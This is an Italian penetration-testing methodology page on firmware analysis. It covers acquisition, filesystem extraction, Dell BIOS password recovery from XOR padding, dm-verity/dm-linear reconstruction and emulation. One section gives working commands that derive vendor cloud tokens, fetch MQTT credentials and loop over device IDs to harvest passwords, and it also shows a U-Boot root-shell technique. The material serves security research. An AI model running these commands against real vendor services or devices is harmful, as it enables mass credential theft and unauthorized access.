# Analisi del firmware

{{#include ../../banners/hacktricks-training.md}}

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
{{#endref}}

## **Introduzione**

### Risorse correlate

{{#ref}}
uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Il firmware è un software essenziale che consente ai dispositivi di funzionare correttamente, gestendo e facilitando la comunicazione tra i componenti hardware e il software con cui interagiscono gli utenti. È memorizzato in una memoria permanente, così che il dispositivo possa accedere alle istruzioni fondamentali fin dal momento dell'accensione, avviando il sistema operativo. Esaminare e, potenzialmente, modificare il firmware è un passaggio fondamentale per individuare vulnerabilità di sicurezza.<sup>[[2]](#references)[[3]](#references)</sup>

## **Raccolta di informazioni**

La **raccolta di informazioni** è un primo passaggio fondamentale per comprendere la composizione di un dispositivo e le tecnologie che utilizza. Il processo comporta la raccolta di dati su:

- L'architettura della CPU e il sistema operativo in esecuzione
- Le specifiche del bootloader
- La disposizione dell'hardware e i datasheet
- Le metriche del codebase e le posizioni del codice sorgente
- Le librerie esterne e i tipi di licenza
- La cronologia degli aggiornamenti e le certificazioni normative
- I diagrammi dell'architettura e dei flussi
- Le valutazioni di sicurezza e le vulnerabilità individuate

A questo scopo, gli strumenti di **open-source intelligence (OSINT)** sono preziosi, così come l'analisi di eventuali componenti software open source disponibili tramite revisioni manuali e automatizzate. Strumenti come [Coverity Scan](https://scan.coverity.com) e [Semmle’s LGTM](https://lgtm.com/#explore) offrono analisi statica gratuite che possono essere utilizzate per individuare potenziali problemi.

## **Acquisizione del firmware**

È possibile ottenere il firmware in vari modi, ciascuno con un diverso livello di complessità:

- **Direttamente** dalla fonte (sviluppatori, produttori)
- **Compilandolo** seguendo le istruzioni fornite
- **Scaricandolo** dai siti di supporto ufficiali
- Utilizzando query **Google dork** per trovare file firmware ospitati online
- Accedendo direttamente allo **cloud storage**, con strumenti come [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Intercettando gli **aggiornamenti** tramite tecniche man-in-the-middle
- **Estraendolo** dal dispositivo tramite connessioni come **UART**, **JTAG** o **PICit**
- **Sniffando** le richieste di aggiornamento nelle comunicazioni del dispositivo
- Individuando e utilizzando **endpoint di aggiornamento hardcoded**
- Eseguendo il **dump** dal bootloader o dalla rete
- **Rimuovendo e leggendo** il chip di memoria, quando ogni altro tentativo fallisce, usando strumenti hardware adeguati

### Log solo UART: forza una root shell tramite l'ambiente U-Boot nella flash

Se RX UART viene ignorato (solo log), puoi comunque forzare una shell init **modificando offline il blob dell'ambiente U-Boot**:<sup>[[6]](#references)</sup>

1. Esegui il dump della flash SPI con una clip SOIC-8 e un programmatore (3,3 V):
   ```bash
   flashrom -p ch341a_spi -r flash.bin
   ```
2. Individua la partizione env di U-Boot, modifica `bootargs` per includere `init=/bin/sh` e **ricalcola il CRC32 dell'env di U-Boot** per il blob.
3. Riflash solo la partizione env e riavvia; dovrebbe comparire una shell su UART.

È utile sui dispositivi embedded in cui la shell del bootloader è disabilitata, ma la partizione env è scrivibile tramite accesso alla flash esterna.

## Analisi del firmware

Ora che **hai il firmware**, devi estrarne le informazioni per capire come gestirlo. Ecco alcuni strumenti che puoi usare:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```

Se non trovi molto con questi strumenti, controlla l'**entropia** dell'immagine con `binwalk -E <bin>`; se è bassa, è improbabile che sia crittografata. Se è alta, è probabile che sia crittografata (o compressa in qualche modo).

Inoltre, puoi usare questi strumenti per estrarre **file incorporati nel firmware**:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Oppure [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) per ispezionare il file.

### Analisi differenziale della flash e archivi segreti XOR recuperabili

Quando un'impostazione del firmware non ha un formato di archiviazione documentato, acquisisci prima diverse letture corrispondenti della flash, modifica **esattamente** un'impostazione, esegui nuovamente il dump del chip completo e confronta gli offset. Ripetere l'esperimento con valori controllati permette di distinguere l'impostazione dai contatori e dai metadati di scrittura; le modifiche a nuovi offset, anziché in-place, indicano un archivio append-only o strutturato a log. Conserva le voci eliminate o contrassegnate come eliminate, perché i byte del loro payload potrebbero essere ancora recuperabili.<sup>[[12]](#references)[[13]](#references)</sup>

```bash
sha256sum baseline-1.bin baseline-2.bin baseline-3.bin
cmp -l baseline-1.bin changed.bin
```

Dopo aver individuato la regione, estrai i moduli del firmware con strumenti come `binwalk` e fai reverse engineering di writer/validator in Ghidra. Verifica nel codice i limiti dei campi, il padding, l’indicizzazione delle chiavi e la derivazione delle chiavi, invece di dedurre lo schema solo dai pattern del ciphertext.<sup>[[12]](#references)</sup>

#### Recuperare le chiavi dal padding a zero cifrato

Come descritto in [cifratura basata su XOR](../../crypto/symmetric/#xor-based-encryption), il plaintext noto rivela i byte del keystream agli stessi offset. Un campo di dimensione fissa è particolarmente esposto quando il padding a zero copre tutti gli indici di una chiave XOR ripetuta: il padding cifrato rivela direttamente quei byte della chiave, perché `0x00 XOR key_byte = key_byte`. Se sono coperti tutti gli indici della chiave, ricostruisci la chiave dalla coda del ciphertext e decifra i byte valorizzati.<sup>[[12]](#references)</sup>

Il formato DVAR vulnerabile delle password BIOS di Dell è un esempio concreto: il byte `0` di un campo da 32 byte è in plaintext, mentre i byte `1..31` usano una chiave ripetuta di 20 byte.<sup>[[12]](#references)</sup>

```text
stored[0] = password[0]
stored[i] = password[i] XOR key[(i - 1) mod 20]  # i = 1..31
```

Per una lunghezza della password `L`, le posizioni da `L` a `31` erano zero prima dello XOR. Quando `L <= 12`, queste posizioni coprono tutti gli indici della chiave, quindi la chiave completa e la password vengono recuperate senza brute force:<sup>[[12]](#references)</sup>

```text
key[(i - 1) mod 20] = stored[i]                  # padding positions
password[i] = stored[i] XOR key[(i - 1) mod 20] # populated positions
```

#### Recuperare le chiavi dai record storici

Non analizzare ogni record separatamente. La chiave DVAR viene derivata approssimativamente come `modified_md5(device_seed || variable_GUID || password[0])`: il device seed e il GUID sono fissi e l’unico input dipendente dalla password è il primo byte in chiaro. Questo dà al massimo 256 chiavi per dispositivo e fa sì che i record che iniziano con lo stesso byte condividano una chiave. Raggruppa i record attivi e quelli eliminati in base a quel byte; un breve record storico può leakare la chiave completa tramite il padding e decifrare un record corrente più lungo il cui padding, da solo, non è sufficiente. La rotazione della password può quindi aumentare l’esposizione quando il vecchio ciphertext viene tombstoned anziché cancellato.<sup>[[12]](#references)</sup>

Lo strumento [`dellpwn`](https://github.com/R3n5k1/dellpwn) individua DVAR, convalida i record candidati, recupera le password e può mostrare i byte grezzi memorizzati e quelli della chiave. Compilalo da un checkout e analizza un’immagine flash verificata come segue:<sup>[[13]](#references)</sup>

```bash
cargo install --path .
dellpwn scan dump.bin --raw
dellpwn scan dump.bin --partial  # include uncertain recoveries
```

Per i parser personalizzati, scarta i falsi positivi usando la struttura dei record, i vincoli sui caratteri stampabili, i controlli del padding a zero, l’entropia della chiave e la coerenza quando la chiave ricomincia. Se dump ripetuti mostrano sparse variazioni di bit per scrittura, elenca le maschere osservate e ordina le correzioni in base a questi vincoli, ma segnala i caratteri ambigui invece di presentare un risultato euristico come un recupero esatto.<sup>[[12]](#references)</sup>

I verificatori di password dovrebbero archiviare un hash unidirezionale iterato e con salt, anziché testo cifrato reversibile; gli archivi strutturati come log dovrebbero rimuovere in modo sicuro il materiale segreto sostituito.<sup>[[12]](#references)</sup>

### Ottenere il file system

Con gli strumenti commentati in precedenza, come `binwalk -ev <bin>`, avresti dovuto riuscire a **estrarre il file system**.\
Binwalk di solito lo estrae in una **cartella denominata in base al tipo di file system**, che di solito è uno dei seguenti: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Estrazione manuale del file system

A volte, binwalk **non include il byte magico del file system nelle sue firme**. In questi casi, usa binwalk per **individuare l’offset del file system ed estrarre il file system compresso** dal binario, quindi **estrai manualmente** il file system in base al suo tipo, seguendo i passaggi qui sotto.

```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```

Esegui il seguente **dd command** per eseguire il carving del filesystem Squashfs.

```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```

In alternativa, si potrebbe eseguire anche il seguente comando.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Per squashfs (usato nell'esempio sopra)

`$ unsquashfs dir.squashfs`

I file si troveranno successivamente nella directory "`squashfs-root`".

- File di archivio CPIO

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Per filesystem jffs2

`$ jefferson rootfsfile.jffs2`

- Per filesystem ubifs con NAND flash

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

### Ricostruire filesystem root embedded suddivisi

Se un dump raw di eMMC/SSD contiene un header di filesystem valido, ma gli offset dei metadati si estendono oltre la partizione nominale, non classificarlo subito come corrotto. Il codice di avvio embedded può assemblare il dispositivo root effettivo da più intervalli fisici tramite Device Mapper, quindi l'estrazione da una singola partizione GPT produce solo il primo segmento.<sup>[[9]](#references)</sup>

#### Triage dell'immagine completa del supporto

Verifica innanzitutto che l'acquisizione sia terminata, che la dimensione sia stabile e che nessun processo di scrittura stia ancora utilizzando l'immagine. Se il nome del file codifica un indirizzo iniziale e finale, confronta quell'intervallo con il numero effettivo di byte. Recupera la GPT in modalità di sola lettura e collega solo l'intervallo richiesto; **non** eseguire `vgchange -ay` su un volume fisico non attendibile sulla workstation, perché sono possibili conflitti tra gruppi di volumi e scritture involontarie.<sup>[[9]](#references)</sup>

```bash
stat -c '%s bytes' firmware.bin
lsof -- firmware.bin
fdisk -l firmware.bin
parted firmware.bin unit B print

# Inspect one partition without copying it
sudo losetup --find --show --read-only \
  --offset "$PART_OFF" --sizelimit "$PART_LEN" firmware.bin
```

Preferisci una VM usa e getta quando la logica originale di init o uno stack LVM deve vedere l'intera immagine. I log di avvio storici di una partizione di boot standard sono particolarmente utili: il bootloader potrebbe aver registrato gli offset dei container proprietari, le lunghezze dei componenti, la selezione dello slot, le regole di allineamento e la verifica delle signature. Usa questi valori per estrarre una command line, un kernel e un initramfs incorporati, quindi convalida ogni output in modo indipendente con `file`, i magic byte e `binwalk`; leggere fino alla fine del container può aggiungere accidentalmente al kernel un initrd, un oggetto ACPI o una signature.<sup>[[9]](#references)</sup>

#### Recuperare la mappa dei blocchi al boot

Estrai l'initramfs del kernel e fai reverse engineering di `/init` e delle eventuali librerie di storage. In [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/), segui i riferimenti alle stringhe per `/proc/cmdline`, `/dev/mapper/`, `dmsetup`, `BLKGETSIZE64` e i percorsi delle partizioni; poi segui il codice che seleziona lo slot A/B attivo e crea la tabella. Alcuni utili punti di partenza per radare2 sono `r2 -A init`, `afl`, `pdf @ main` e `pdf @ fcn.xxxxx`.<sup>[[9]](#references)</sup>

Il target linear mappa intervalli consecutivi di un dispositivo virtuale su intervalli di uno o più dispositivi sottostanti. Una tabella recuperata con due segmenti ha comunemente questa forma (tutte le posizioni e le lunghezze sono espresse in settori da 512 byte):<sup>[[9]](#references)[[10]](#references)</sup>

```text
0              <seg1_sectors> linear /dev/mmcblk0p2 0
<seg1_sectors> <seg2_sectors> linear /dev/mmcblk0p4 <tail_start>
```

Riproduci esattamente l'aritmetica del codice macchina, inclusi la larghezza degli interi, gli shift e le conversioni di unità. Ad esempio, la seguente espressione arrotonda per difetto una dimensione in byte al multiplo di 4 KiB e solo successivamente la converte in settori da 512 byte; sostituirla con `p4_bytes // 512` sposta la coda selezionata di `p4_bytes % 4096` ogni volta che la partizione non è allineata alla pagina.<sup>[[9]](#references)</sup>

```python
p4_sectors = (p4_bytes >> 12) << 3
effective_bytes = p4_sectors * 512
tail_start = effective_bytes - tail_distance
```

Ricostruisci un’immagine di analisi piatta copiando gli intervalli nell’ordine della tabella, usando chunk di dimensioni limitate invece di caricare l’intero dump del supporto in memoria. In questo modo eviti anche di creare dispositivi mapper lato host. Mantieni gli offset derivati da GPT, i conteggi dei settori invertiti e la lunghezza dell’output risultante come asserzioni separate.<sup>[[9]](#references)</sup>

#### Distingui la corruzione da un errore costante di ricostruzione

Per SquashFS, controlla il magic `hsqs` e decodifica il campo little-endian a 64 bit `bytes_used` all’offset 40 del superblock prima di eseguire `unsquashfs`. Se l’estrazione fallisce in diverse strutture non correlate, cerca in un’ampia finestra intorno alle posizioni previste e richiedi candidati strutturali solidi: un blocco di metadati decomprimibile, diverse voci di directory valide consecutive, campi inode plausibili, un inode root coerente con il conteggio degli inode o una struttura di metadati di integrità valida. Una singola corrispondenza del magic non è sufficiente.<sup>[[9]](#references)</sup>

```python
import struct

with open("rootfs.img", "rb") as f:
    sb = f.read(96)
assert sb[:4] == b"hsqs"
bytes_used = struct.unpack_from("<Q", sb, 40)[0]
nominal_end = (bytes_used + 4095) & ~4095
print(hex(bytes_used), hex(nominal_end))
```

Quando lo stesso delta con segno rende valide strutture indipendenti, ad esempio i metadati di una directory e un record verity, la causa più probabile è un errore sistematico nell'inizio del segmento, non byte mancanti. Torna ai calcoli invertiti e cerca resti scartati, problemi di signedness, overflow o arrotondamenti a settori/pagine prima di tentare il recupero di file orfani o di correggere i metadati del filesystem.<sup>[[9]](#references)</sup>

Infine, mantieni separati i confini di protezione: i volumi LUKS con chiavi sigillate nel TPM proteggono la riservatezza dei dati, mentre una mappatura dm-verity firmata protegge l'integrità del filesystem root. Un TPM software non recupera una chiave sigillata nel TPM fisico originale e avviare una SquashFS modificata tramite un init destinato esclusivamente alla ricerca che omette la verifica verity non ne falsifica la firma né compromette dm-verity.<sup>[[9]](#references)</sup>

## Analisi del firmware

Una volta ottenuto il firmware, è essenziale esaminarlo per comprenderne la struttura e individuare potenziali vulnerabilità. Questo processo prevede l'utilizzo di vari strumenti per analizzare ed estrarre dati utili dall'immagine del firmware.

### Strumenti di analisi iniziale

È fornito un insieme di comandi per l'ispezione iniziale del file binario (indicato come `<bin>`). Questi comandi aiutano a identificare i tipi di file, estrarre stringhe, analizzare dati binari e comprendere i dettagli delle partizioni e dei filesystem:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```

Per valutare lo stato della cifratura dell'immagine, si controlla l'**entropia** con `binwalk -E <bin>`. Una bassa entropia suggerisce l'assenza di cifratura, mentre un'entropia elevata indica una possibile cifratura o compressione.

Per estrarre i **file incorporati**, si consigliano strumenti e risorse come la documentazione **file-data-carving-recovery-tools** e **binvis.io** per l'ispezione dei file.

### Estrazione del filesystem

Con `binwalk -ev <bin>`, di solito è possibile estrarre il filesystem, spesso in una directory denominata in base al tipo di filesystem (ad es. squashfs, ubifs). Tuttavia, quando **binwalk** non riesce a riconoscere il tipo di filesystem a causa di magic byte mancanti, è necessario procedere all'estrazione manuale. A tal fine, si usa `binwalk` per individuare l'offset del filesystem, quindi si usa il comando `dd` per estrarre il filesystem:

```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```

Successivamente, a seconda del tipo di filesystem (ad es. squashfs, cpio, jffs2, ubifs), si usano comandi diversi per estrarne manualmente i contenuti.

### Analisi del filesystem

Una volta estratto il filesystem, inizia la ricerca di vulnerabilità. Si presta attenzione ai demoni di rete non sicuri, alle credenziali hardcoded, agli endpoint API, alle funzionalità dei server di aggiornamento, al codice non compilato, agli script di avvio e ai binari compilati da analizzare offline.

**Percorsi** e **elementi chiave** da esaminare includono:

- **etc/shadow** e **etc/passwd** per le credenziali degli utenti
- Certificati e chiavi SSL in **etc/ssl**
- File di configurazione e script per individuare potenziali vulnerabilità
- Binari embedded da analizzare ulteriormente
- Web server e binari comuni dei dispositivi IoT

Diversi strumenti aiutano a individuare informazioni sensibili e vulnerabilità all'interno del filesystem:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) e [**Firmwalker**](https://github.com/craigz28/firmwalker) per cercare informazioni sensibili
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) per un'analisi completa del firmware
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) ed [**EMBA**](https://github.com/e-m-b-a/emba) per l'analisi statica e dinamica

### Controlli di sicurezza sui binari compilati

Sia il codice sorgente sia i binari compilati presenti nel filesystem devono essere esaminati attentamente per individuare vulnerabilità. Strumenti come **checksec.sh** per i binari Unix e **PESecurity** per i binari Windows aiutano a identificare i binari non protetti che potrebbero essere sfruttati.

## Raccolta di configurazioni cloud e credenziali MQTT tramite token URL derivati

Molti hub IoT recuperano la configurazione specifica del dispositivo da un endpoint cloud simile a:<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

Durante l'analisi del firmware, potresti scoprire che `<token>` viene derivato localmente dall'ID del dispositivo usando un segreto hardcoded, ad esempio:

- token = MD5( deviceId || STATIC_KEY ) e rappresentato in esadecimale maiuscolo

Questo design consente a chiunque conosca un deviceId e la STATIC_KEY di ricostruire l'URL e recuperare la configurazione cloud, che spesso rivela credenziali MQTT in testo in chiaro e prefissi dei topic.

Procedura pratica:

1) Estrarre deviceId dai log di avvio UART

- Collegare un adattatore UART da 3,3 V (TX/RX/GND) e acquisire i log:

```bash
picocom -b 115200 /dev/ttyUSB0
```

- Cerca le righe che stampano il pattern dell'URL di configurazione cloud e l'indirizzo del broker, ad esempio:

```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```

2) Recuperare STATIC_KEY e l'algoritmo del token dal firmware

- Carica i binari in Ghidra/radare2 e cerca il percorso di configurazione ("/pf/") o l'uso di MD5.
- Conferma l'algoritmo (ad es., MD5(deviceId||STATIC_KEY)).
- Deriva il token in Bash e converti il digest in maiuscolo:

```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```

3) Recupera la configurazione cloud e le credenziali MQTT

- Componi l'URL e scarica il JSON con curl; analizzalo con jq per estrarre i secret:

```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```

4) Sfrutta MQTT in chiaro e ACL deboli sui topic (se presenti)

- Usa le credenziali recuperate per sottoscriverti ai topic di manutenzione e cercare eventi sensibili:

```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
  -i <client_id> -u <username> -P <password> \
  -t "<topic_prefix>/<deviceId>/admin" -v
```

5) Enumerare gli ID dei dispositivi prevedibili (su larga scala, con autorizzazione)

- Molti ecosistemi incorporano byte OUI/prodotto/tipo del vendor seguiti da un suffisso sequenziale.
- È possibile iterare sugli ID candidati, derivare token e recuperare configurazioni programmaticamente:

```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
  DEVICE_ID="${PREFIX}${SUF}"
  TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
  curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```

Note
- Ottieni sempre un’autorizzazione esplicita prima di tentare l’enumerazione su larga scala.
- Quando possibile, preferisci l’emulazione o l’analisi statica per recuperare i segreti senza modificare l’hardware di destinazione.

Il processo di emulazione del firmware consente l’**analisi dinamica** del funzionamento di un dispositivo o di un singolo programma. Questo approccio può incontrare difficoltà legate alle dipendenze dall’hardware o dall’architettura, ma trasferire il root filesystem o specifici binari su un dispositivo con architettura e endianness corrispondenti, come un Raspberry Pi, o su una macchina virtuale preconfigurata può facilitare ulteriori test.

### Emulazione di singoli binari

Per esaminare singoli programmi, è fondamentale identificare l’endianness e l’architettura della CPU del programma.

#### Esempio con architettura MIPS

Per emulare un binario con architettura MIPS, si può usare il comando:

```bash
file ./squashfs-root/bin/busybox
```

E per installare gli strumenti di emulazione necessari:

```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```

Per MIPS (big-endian) si usa `qemu-mips`, mentre per i binari little-endian si usa `qemu-mipsel`.

#### Emulazione dell’architettura ARM

Per i binari ARM, il processo è simile: per l’emulazione si usa l’emulatore `qemu-arm`.

### Emulazione dell’intero sistema

Strumenti come [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) e altri facilitano l’emulazione completa del firmware, automatizzando il processo e agevolando l’analisi dinamica.

### Ricostruzione di filesystem root suddivisi e verificati per l’emulazione

Se il superblock di SquashFS è leggibile, ma gli offset delle tabelle di inode, directory o frammenti sono impossibili, non modificare subito `unsquashfs`. Esegui il reverse engineering del binario di avvio iniziale e riproduci il grafo dei dispositivi a blocchi che crea: i sistemi embedded possono esporre una partizione root nominale, ma costruire il filesystem effettivo con una mappatura `dm-linear` che aggiunge settori presi in prestito da un’altra partizione. I controlli del solo superblock possono avere esito positivo anche quando tutti i blocchi di metadati successivi sono spostati.<sup>[[11]](#references)</sup>

Mantieni esattamente l’aritmetica del firmware. In particolare, determina se le lunghezze sono espresse in byte, settori da 512 byte o pagine da 4 KiB; riproduci gli shift e il troncamento nell’ordine originale; e considera le regioni finali dipendenti dal bank nei layout A/B. Ad esempio, `(partition_bytes >> 12) << 3` prima tronca a un confine di 4 KiB e solo successivamente esprime il risultato in settori da 512 byte; sostituirlo con `partition_bytes // 512` può spostare di alcuni kilobyte l’estensione aggiunta e corrompere tutte le tabelle SquashFS successive.<sup>[[11]](#references)</sup>

Un flusso di convalida utile è:<sup>[[11]](#references)</sup>

1. Recupera dal binario del verifier/init il dispositivo sorgente, il settore iniziale e la lunghezza di ogni segmento `dm-linear`.
2. Concatena o mappa le estensioni senza modificarne la semantica di allineamento.
3. Se l’estrazione continua a fallire, cerca solo in una piccola finestra attorno al confine previsto e richiedi diverse strutture di metadati valide consecutive, invece di accettare un superblock che sembra plausibile.
4. Esegui `unsquashfs` senza modifiche sull’immagine ricostruita; la corretta traversata di tutte le directory e dei frammenti è una prova più solida di `unsquashfs -stat`.

#### Sostituzione di dm-verity controllata dall’analista

Quando l’analista controlla il kernel QEMU, l’initramfs e i dischi virtuali, è possibile avviare una root modificata sostituendo il PID 1 di verifica del vendor con un piccolo init collegato staticamente. Si tratta di una **sostituzione della boot chain in laboratorio**, non di una compromissione di dm-verity, della sua firma RSA, di Secure Boot o di una chiave sigillata tramite TPM.<sup>[[11]](#references)</sup>

L’init sostitutivo dovrebbe riprodurre le parti operative del percorso di avvio originale: montare `devtmpfs`, chiamare `setsid()`, collegare `/dev/console` ai file descriptor 0–2, montare `/proc` e `/sys`, attendere il dispositivo a blocchi fornito, montare in sola lettura la root modificata, smontare i pseudo-filesystem della vecchia root, spostare il nuovo mount su `/`, eseguire `chroot` e infine `execve()` dell’`/sbin/init` originale del firmware. Smontare `/dev`, `/proc` e `/sys` **prima** di `MS_MOVE` evita di smontare accidentalmente punti di mount appartenenti alla nuova root.<sup>[[11]](#references)</sup>

Mantieni lo stato mutabile del dispositivo separato dalla root immutabile modificata. Un overlay qcow2 può preservare lo stato LVM del disco originale, mentre un secondo disco virtio in sola lettura fornisce il file SquashFS modificato:<sup>[[11]](#references)</sup>

```bash
qemu-img create -f qcow2 -F raw -b emmc.raw overlay.qcow2
qemu-system-x86_64 ... -kernel bzImage -initrd custom-initramfs.cpio.gz \
  -drive if=none,id=emmc,format=qcow2,file=overlay.qcow2 \
  -device sdhci-pci -device sd-card,drive=emmc \
  -drive if=virtio,format=raw,readonly=on,file=rootfs-edited.squashfs
```

#### Debug dello stato dell'immagine offline

Esamina lo stato persistente al di fuori del guest quando gli avvii lenti, gli script di avvio distruttivi o i log della console inaffidabili rendono difficile individuare il problema. Non collegare mai un overlay utilizzato da una VM in esecuzione; esponilo con `qemu-nbd`, limita il rilevamento LVM alla partizione NBD prevista e disattiva il gruppo di volumi prima di disconnetterlo.<sup>[[11]](#references)</sup>

```bash
sudo modprobe nbd max_part=16
sudo qemu-nbd --connect=/dev/nbd0 overlay.qcow2
sudo vgscan --config 'devices { filter = ["a|/dev/nbd0p4|", "r|.*|"] }'
# inspect/fsck/mount the discovered logical volumes
sudo vgchange -an VG_NAME
sudo qemu-nbd --disconnect /dev/nbd0
```

Per un'isolazione dei guasti ripetibile, scrivi file marcatore con timestamp su un volume scrivibile stabile e verificali offline; `/dev/kmsg`, le FIFO e le console transitorie possono generare falsi negativi a causa della limitazione della frequenza o dell'arresto prematuro dei processi. Inoltre, confronta le interfacce esatte tra i livelli prima di modificare codice non correlato: `uname -r` rispetto a `/lib/modules/`, le funzionalità ext4 presenti su disco rispetto alla configurazione del kernel e la generazione di Mesa `libGL` rispetto all'ABI del driver DRI e ai nomi dei driver ricavati dal PCI. Un componente può essere presente e persino caricarsi correttamente con `dlopen()`, ma restare inutilizzabile perché il componente che lo utilizza si aspetta un'ABI diversa.<sup>[[11]](#references)</sup>

## Analisi dinamica nella pratica

In questa fase, per l'analisi si utilizza un ambiente con dispositivo reale o emulato. È essenziale mantenere l'accesso alla shell del sistema operativo e al filesystem. L'emulazione potrebbe non riprodurre perfettamente le interazioni hardware, rendendo talvolta necessario riavviarla. L'analisi dovrebbe esaminare nuovamente il filesystem, sfruttare le pagine web esposte e i servizi di rete ed esplorare le vulnerabilità del bootloader. I test di integrità del firmware sono fondamentali per individuare potenziali vulnerabilità backdoor.

## Tecniche di analisi runtime

L'analisi runtime consiste nell'interagire con un processo o un binario nel suo ambiente operativo, utilizzando strumenti come gdb-multiarch, Frida e Ghidra per impostare breakpoint e individuare vulnerabilità tramite fuzzing e altre tecniche.

Per i target embedded senza un debugger completo, **copia sul dispositivo un `gdbserver` collegato staticamente e connettiti in remoto al processo**:<sup>[[6]](#references)</sup>

```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```

### Mappatura dei messaggi Zigbee / radio-co-processor

Negli hub IoT, lo stack RF è spesso suddiviso tra un **radio MCU** e un processo userland Linux. Un flusso di lavoro utile consiste nel mappare il percorso:<sup>[[8]](#references)</sup>

1. **Frame RF** in onda
2. **Parser lato controller** sul radio MCU
3. **Protocollo testuale o TLV seriale/UART** inoltrato a Linux (ad esempio `/dev/tty*`)
4. **Dispatcher applicativo** nel daemon principale
5. **Handler specifico del protocollo / macchina a stati**

Questa architettura crea due obiettivi di reverse engineering anziché uno. Se il controller converte i frame radio binari in un protocollo testuale come `Group,Command,arg1,arg2,...`, ricostruisci:

- I **gruppi di messaggi** e le tabelle di dispatch
- Quali messaggi possono provenire dalla **rete** e quali dal controller stesso
- Gli esatti **campi discriminatori specifici del produttore** (ad esempio Zigbee `manufacturer_code` e `cluster_command` personalizzato)
- Quali handler sono raggiungibili solo durante le fasi di **commissioning**, discovery o download del firmware/modello

Per Zigbee in particolare, acquisisci il traffico di pairing e verifica se il target usa ancora la **Link Key** predefinita `ZigBeeAlliance09`. In tal caso, lo sniffing del traffico di commissioning potrebbe esporre la **Network Key**. Gli install code di Zigbee 3.0 riducono questa esposizione: verifica quindi se il dispositivo testato li impone davvero.

### Handler di protocollo specifici del produttore e raggiungibilità vincolata dalla FSM

I comandi Zigbee/ZCL specifici del produttore sono spesso un obiettivo migliore dei cluster standard, perché raggiungono **codice di parsing personalizzato** e **FSM** interne con una validazione meno collaudata sul campo.<sup>[[8]](#references)</sup>

Flusso di lavoro pratico:

- Esegui il reverse engineering del dispatcher dei comandi finché non trovi l'**handler riservato al produttore**.
- Ricostruisci le tabelle di **stato FSM**, **evento**, **controllo**, **azione** e **stato successivo**.
- Identifica gli **stati transitori** che avanzano automaticamente e i rami di retry/errore che alla fine eseguono il reset o liberano lo stato controllato dall'attaccante.
